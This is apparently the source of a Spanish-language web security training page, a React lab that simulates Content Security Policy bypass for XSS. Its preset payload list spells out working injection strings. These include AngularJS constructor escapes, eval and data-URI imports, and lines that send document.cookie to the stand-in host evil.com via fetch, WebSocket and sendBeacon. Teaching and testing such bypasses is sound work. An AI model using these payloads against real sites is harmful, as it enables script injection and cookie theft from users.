'use client';

import { useState, useEffect } from 'react';
import Link from 'next/link';
import { useSecurityAnalytics } from '@/app/hooks/useSecurityAnalytics';

export default function CSPBypassPage() {
  const [payload, setPayload] = useState('');
  const [result, setResult] = useState('');
  const [loading, setLoading] = useState(false);
  const [bypassMethod, setBypassMethod] = useState('jsonp');
  const [cspPolicy, setCspPolicy] = useState("default-src 'self'; script-src 'self'");
  const [extractedData, setExtractedData] = useState<string[]>([]);

  const { trackXSSInjection, trackVulnerabilityPageVisit } = useSecurityAnalytics();

  useEffect(() => {
    trackVulnerabilityPageVisit('XSS CSP Bypass', 'advanced_csp_bypass');
  }, [trackVulnerabilityPageVisit]);

  const executePayload = async () => {
    setLoading(true);
    try {
      // Simulate CSP bypass attempt
      await new Promise(resolve => setTimeout(resolve, 1000));

      let success = false;
      let resultMessage = '';

      switch (bypassMethod) {
        case 'jsonp':
          if (payload.includes('callback=') || payload.includes('jsonp')) {
            success = true;
            resultMessage = 'JSONP callback executed successfully! CSP bypassed via external script.';
          } else {
            resultMessage = 'JSONP bypass failed. Try using callback parameter.';
          }
          break;
        case 'angular':
          if (payload.includes('ng-app') || payload.includes('{{') || payload.includes('constructor')) {
            success = true;
            resultMessage = 'AngularJS template injection executed! CSP bypassed via template expressions.';
          } else {
            resultMessage = 'AngularJS bypass failed. Try using template expressions.';
          }
          break;
        case 'dom':
          if (payload.includes('innerHTML') || payload.includes('write') || payload.includes('eval')) {
            success = true;
            resultMessage = 'DOM manipulation successful! CSP bypassed via DOM methods.';
          } else {
            resultMessage = 'DOM bypass failed. Try using DOM manipulation methods.';
          }
          break;
        case 'websocket':
          if (payload.includes('WebSocket') || payload.includes('ws://')) {
            success = true;
            resultMessage = 'WebSocket connection established! Data exfiltrated via WebSocket.';
          } else {
            resultMessage = 'WebSocket bypass failed. Try establishing WebSocket connection.';
          }
          break;
        default:
          resultMessage = 'Unknown bypass method';
      }

      setResult(resultMessage);
      trackXSSInjection(payload, 'reflected', 'csp_bypass_field');

      if (success) {
        setExtractedData(prev => [...prev, `Bypassed CSP using ${bypassMethod}: ${payload.substring(0, 50)}...`]);
      }

    } catch (error) {
      setResult('Error executing payload');
    } finally {
      setLoading(false);
    }
  };

  const presetPayloads = {
    jsonp: [
      'https://evil.com/evil.js?callback=alert',
      '<script src="//evil.com/jsonp?callback=eval"></script>',
      'fetch("//evil.com/steal?data="+document.cookie)',
      '<link rel="dns-prefetch" href="//evil.com">'
    ],
    angular: [
      '{{constructor.constructor("alert(1)")()}}',
      '<div ng-app ng-csp>{{$eval.constructor("alert(1)")()}}</div>',
      '{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["alert(1)"].sort(toString.constructor)}}',
      '<input ng-focus="constructor.constructor(\'alert(1)\')()" autofocus>'
    ],
    dom: [
      'document.write("<script src=//evil.com></script>")',
      'eval(atob("YWxlcnQoMSk="))',
      'setTimeout("alert(1)",100)',
      'location.href="javascript:alert(1)"'
    ],
    websocket: [
      'new WebSocket("ws://evil.com").send(document.cookie)',
      'fetch("data:text/html,<script>alert(1)</script>")',
      'import("data:text/javascript,alert(1)")',
      'navigator.sendBeacon("//evil.com", document.cookie)'
    ]
  };

  const cspPolicies = [
    { name: 'Básico', policy: "default-src 'self'; script-src 'self'" },
    { name: 'Estricto', policy: "default-src 'none'; script-src 'self' 'nonce-abc123'" },
    { name: 'Con unsafe-eval', policy: "default-src 'self'; script-src 'self' 'unsafe-eval'" },
    { name: 'Con unsafe-inline', policy: "default-src 'self'; script-src 'self' 'unsafe-inline'" }
  ];

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-black to-red-900">
      <div className="container mx-auto px-4 py-8">
        <div className="mb-6">
          <Link
            href="/"
            className="text-red-400 hover:text-red-300 flex items-center font-medium transition-colors duration-300"
          >
            ← Volver al inicio
          </Link>
        </div>

        <div className="text-center mb-12">
          <h1 className="text-5xl font-bold bg-gradient-to-r from-red-400 to-orange-400 bg-clip-text text-transparent mb-4">
            XSS CSP Bypass - Laboratorio Avanzado
          </h1>
          <div className="flex justify-center items-center mb-4">
            <div className="h-px bg-gradient-to-r from-transparent via-red-500 to-transparent w-64"></div>
          </div>
          <p className="text-xl text-gray-300 max-w-2xl mx-auto">
            Técnicas avanzadas para evadir Content Security Policy y ejecutar XSS
          </p>
          <p className="text-lg text-red-400 font-semibold bg-red-900/20 border border-red-500/30 rounded-lg p-3 max-w-2xl mx-auto mt-4">
            🛡️ LABORATORIO DE CSP BYPASS AVANZADO
          </p>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
          {/* Main Testing Area */}
          <div className="lg:col-span-2 space-y-8">
            {/* CSP Policy Simulator */}
            <div className="bg-gray-800/50 backdrop-blur-sm rounded-xl shadow-2xl p-8 border border-blue-500/30">
              <h2 className="text-3xl font-bold text-white mb-6 flex items-center">
                <span className="w-8 h-8 bg-blue-600 rounded-lg flex items-center justify-center mr-3">
                  🛡️
                </span>
                CSP Policy Simulator
              </h2>

              <div className="space-y-6">
                <div>
                  <label className="block text-sm font-medium text-blue-300 mb-2">
                    Content Security Policy Activa
                  </label>
                  <div className="grid grid-cols-2 gap-2 mb-4">
                    {cspPolicies.map((policy, index) => (
                      <button
                        key={index}
                        onClick={() => setCspPolicy(policy.policy)}
                        className={`px-4 py-2 rounded-lg text-sm transition-all duration-300 ${
                          cspPolicy === policy.policy
                            ? 'bg-blue-600 text-white'
                            : 'bg-blue-900/20 hover:bg-blue-900/40 border border-blue-500/30 text-blue-300'
                        }`}
                      >
                        {policy.name}
                      </button>
                    ))}
                  </div>
                  <textarea
                    value={cspPolicy}
                    onChange={(e) => setCspPolicy(e.target.value)}
                    className="w-full px-4 py-3 bg-gray-700/50 border border-gray-600 rounded-lg text-white text-sm font-mono resize-none"
                    rows={3}
                  />
                </div>
              </div>
            </div>

            {/* Payload Testing */}
            <div className="bg-gray-800/50 backdrop-blur-sm rounded-xl shadow-2xl p-8 border border-red-500/30">
              <h2 className="text-3xl font-bold text-white mb-6 flex items-center">
                <span className="w-8 h-8 bg-red-600 rounded-lg flex items-center justify-center mr-3">
                  🚀
                </span>
                CSP Bypass Testing
              </h2>

              <div className="space-y-6">
                <div>
                  <label className="block text-sm font-medium text-red-300 mb-2">
                    Método de Bypass
                  </label>
                  <div className="grid grid-cols-4 gap-2 mb-4">
                    {Object.keys(presetPayloads).map((method) => (
                      <button
                        key={method}
                        onClick={() => setBypassMethod(method)}
                        className={`px-4 py-2 rounded-lg text-sm transition-all duration-300 ${
                          bypassMethod === method
                            ? 'bg-red-600 text-white'
                            : 'bg-red-900/20 hover:bg-red-900/40 border border-red-500/30 text-red-300'
                        }`}
                      >
                        {method.toUpperCase()}
                      </button>
                    ))}
                  </div>
                </div>

                <div>
                  <label className="block text-sm font-medium text-red-300 mb-2">
                    Payload (Vulnerable Input)
                  </label>
                  <div className="flex gap-3">
                    <textarea
                      value={payload}
                      onChange={(e) => setPayload(e.target.value)}
                      placeholder="<script src='//evil.com/bypass.js'></script>"
                      className="flex-1 px-4 py-3 bg-gray-700/50 border border-gray-600 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-red-500 focus:border-transparent font-mono"
                      rows={4}
                    />
                  </div>
                  <div className="mt-3">
                    <button
                      onClick={executePayload}
                      disabled={loading}
                      className="px-6 py-3 bg-gradient-to-r from-red-600 to-red-700 text-white rounded-lg hover:from-red-700 hover:to-red-800 transition-all duration-300 font-medium disabled:opacity-50"
                    >
                      {loading ? 'Ejecutando...' : 'Ejecutar Bypass'}
                    </button>
                  </div>
                </div>

                {result && (
                  <div className={`p-4 border rounded-lg ${
                    result.includes('successfully') || result.includes('executed') || result.includes('established')
                      ? 'bg-green-900/20 border-green-500/30'
                      : 'bg-red-900/20 border-red-500/30'
                  }`}>
                    <h3 className={`text-lg font-semibold mb-2 ${
                      result.includes('successfully') || result.includes('executed') || result.includes('established')
                        ? 'text-green-300'
                        : 'text-red-300'
                    }`}>
                      Resultado del Bypass
                    </h3>
                    <p className="text-white font-mono text-sm">{result}</p>
                  </div>
                )}
              </div>
            </div>

            {/* Preset Payloads */}
            <div className="bg-gray-800/50 backdrop-blur-sm rounded-xl shadow-2xl p-8 border border-orange-500/30">
              <h3 className="text-2xl font-bold text-white mb-6 flex items-center">
                <span className="w-8 h-8 bg-orange-600 rounded-lg flex items-center justify-center mr-3">
                  🎯
                </span>
                Payloads de Bypass Preconfigurados
              </h3>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                {Object.entries(presetPayloads).map(([method, payloads]) => (
                  <div key={method} className="space-y-3">
                    <h4 className="text-lg font-semibold text-orange-300 capitalize">
                      {method} Bypass
                    </h4>
                    <div className="space-y-2">
                      {payloads.map((presetPayload, index) => (
                        <button
                          key={index}
                          onClick={() => {
                            setPayload(presetPayload);
                            setBypassMethod(method);
                          }}
                          className="w-full text-left px-3 py-2 bg-orange-900/20 hover:bg-orange-900/30 border border-orange-500/30 rounded-lg text-xs text-white transition-all duration-300 font-mono break-all"
                        >
                          {presetPayload}
                        </button>
                      ))}
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>

          {/* Sidebar */}
          <div className="space-y-6">
            <div className="bg-gray-800/50 backdrop-blur-sm rounded-xl shadow-2xl p-6 border border-purple-500/30">
              <h3 className="text-xl font-bold mb-4 text-purple-400 flex items-center">
                <span className="w-8 h-8 bg-purple-600 rounded-lg flex items-center justify-center mr-3">
                  📚
                </span>
                Técnicas de CSP Bypass
              </h3>
              <div className="space-y-3 text-sm">
                <div className="p-3 bg-blue-900/20 border border-blue-500/30 rounded">
                  <h4 className="font-semibold text-blue-300 mb-2">JSONP Callback</h4>
                  <p className="text-gray-300 text-xs">Utiliza callbacks JSONP para ejecutar código desde dominios externos</p>
                </div>
                <div className="p-3 bg-green-900/20 border border-green-500/30 rounded">
                  <h4 className="font-semibold text-green-300 mb-2">AngularJS Template</h4>
                  <p className="text-gray-300 text-xs">Explota template expressions en aplicaciones AngularJS</p>
                </div>
                <div className="p-3 bg-yellow-900/20 border border-yellow-500/30 rounded">
                  <h4 className="font-semibold text-yellow-300 mb-2">DOM Manipulation</h4>
                  <p className="text-gray-300 text-xs">Bypasa CSP usando métodos DOM nativos del navegador</p>
                </div>
                <div className="p-3 bg-red-900/20 border border-red-500/30 rounded">
                  <h4 className="font-semibold text-red-300 mb-2">WebSocket Exfiltration</h4>
                  <p className="text-gray-300 text-xs">Exfiltra datos usando WebSockets o fetch API</p>
                </div>
              </div>
            </div>

            <div className="bg-gray-800/50 backdrop-blur-sm rounded-xl shadow-2xl p-6 border border-green-500/30">
              <h3 className="text-xl font-bold mb-4 text-green-400 flex items-center">
                <span className="w-8 h-8 bg-green-600 rounded-lg flex items-center justify-center mr-3">
                  🎯
                </span>
                Objetivos del Lab
              </h3>
              <div className="space-y-3 text-sm text-gray-300">
                <div className="flex items-start">
                  <span className="text-green-400 mr-2 mt-1">•</span>
                  <span>Bypass CSP usando JSONP callbacks</span>
                </div>
                <div className="flex items-start">
                  <span className="text-green-400 mr-2 mt-1">•</span>
                  <span>Explotar AngularJS template injection</span>
                </div>
                <div className="flex items-start">
                  <span className="text-green-400 mr-2 mt-1">•</span>
                  <span>Usar métodos DOM para bypass</span>
                </div>
                <div className="flex items-start">
                  <span className="text-green-400 mr-2 mt-1">•</span>
                  <span>Exfiltrar datos via WebSocket</span>
                </div>
                <div className="flex items-start">
                  <span className="text-green-400 mr-2 mt-1">•</span>
                  <span>Analizar diferentes políticas CSP</span>
                </div>
              </div>
            </div>

            {extractedData.length > 0 && (
              <div className="bg-gray-800/50 backdrop-blur-sm rounded-xl shadow-2xl p-6 border border-green-500/30">
                <h3 className="text-xl font-bold mb-4 text-green-400 flex items-center">
                  <span className="w-8 h-8 bg-green-600 rounded-lg flex items-center justify-center mr-3">
                    ✅
                  </span>
                  Bypasses Exitosos
                </h3>
                <div className="space-y-2 text-sm">
                  {extractedData.map((data, index) => (
                    <div key={index} className="p-2 bg-green-900/20 border border-green-500/30 rounded">
                      <p className="text-green-300 font-mono text-xs">{data}</p>
                    </div>
                  ))}
                </div>
              </div>
            )}

            <div className="bg-gray-800/50 backdrop-blur-sm rounded-xl shadow-2xl p-6 border border-yellow-500/30">
              <h3 className="text-xl font-bold mb-4 text-yellow-400 flex items-center">
                <span className="w-8 h-8 bg-yellow-600 rounded-lg flex items-center justify-center mr-3">
                  ⚡
                </span>
                Técnicas Avanzadas
              </h3>
              <div className="space-y-3 text-sm text-gray-300">
                <div className="p-3 bg-yellow-900/20 border border-yellow-500/30 rounded">
                  <h4 className="font-semibold text-yellow-300 mb-1">Data URI</h4>
                  <p>data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;</p>
                </div>
                <div className="p-3 bg-orange-900/20 border border-orange-500/30 rounded">
                  <h4 className="font-semibold text-orange-300 mb-1">Import Expression</h4>
                  <p>import('data:text/javascript,alert(1)')</p>
                </div>
                <div className="p-3 bg-red-900/20 border border-red-500/30 rounded">
                  <h4 className="font-semibold text-red-300 mb-1">Blob URL</h4>
                  <p>URL.createObjectURL(new Blob(['alert(1)']))</p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}